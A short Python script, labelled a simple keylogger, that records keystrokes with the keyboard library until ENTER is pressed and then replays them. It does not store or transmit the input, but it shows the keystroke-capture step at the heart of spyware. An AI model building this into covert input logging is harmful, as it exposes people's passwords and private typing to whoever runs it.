# Created by: Cody Vantienen
# May 1 2022 
# python script of simple keylogger

#!/usr/bin/env python3
import keyboard
keys = keyboard.record(until ='ENTER')
keyboard.play(keys)